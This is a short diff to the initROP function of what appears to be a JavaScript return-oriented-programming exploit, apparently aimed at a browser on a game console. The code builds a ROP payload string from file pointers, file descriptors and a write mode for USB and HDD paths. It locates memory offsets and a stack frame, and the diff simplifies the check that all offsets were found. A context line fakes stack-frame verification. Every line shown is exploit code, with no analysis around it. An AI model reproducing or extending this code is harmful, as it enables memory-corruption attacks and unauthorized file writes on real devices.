@@ -28,7 +28,7 @@ function initROP()
 		
 		// ==============================================================================
 		// Find File Pointers
-		showFoundOffsets("base_fp");
+		showFoundOffsets(offset_find_base_fp);
 		ph = 0x6CFD;
 		base_fp=unescape("\u4242\u0000")+hexw2bin(setFileMode("wb"))+hexw2bin(write_bytes)+hexw2bin(usb_fp)+hexw2bin(usb_fp2)+hexw2bin(hdd_fp)+hexw2bin(hdd_fp2)+hexw2bin(usb_fd)+hexw2bin(usb_fd2)+hexw2bin(hdd_fd)+hexw2bin(hdd_fd2)+hexw2bin(fd)+hexw2bin(fd2)+hexw2bin(magic)+unescape("\u0000")+str2u(path_fp)+unescape("\u0000")+str2u(path_fp2)+unescape("\u0000")+str2u(path_src_fp)+unescape("\u0000")+str2u(path_dest_fp)+unescape("\u0000\uFD6C");
 		
@@ -50,7 +50,7 @@ function initROP()
 		
 		// ==============================================================================
 		// Find Stackframe Pointer
-		showFoundOffsets("stack_frame");
+		showFoundOffsets(offset_find_stack_frame);
 		useCustomStackFrame();// call this to setup all params
 		//stackFrameTest();// use default stackframe for testing
 		
@@ -130,7 +130,7 @@ function initROP()
 				stackframe_verified=true;// fake verify
 			}
 			
-			if((j2===jump_2)&&(j1===jump_1)&&(base===base_fp)&&(stackframe_verified))
+			if(allOffsetsFound)
 			{
 				if(debug_mode)logAdd(verify_success);
 				if(t_out!=0){searchResetTimeout();}
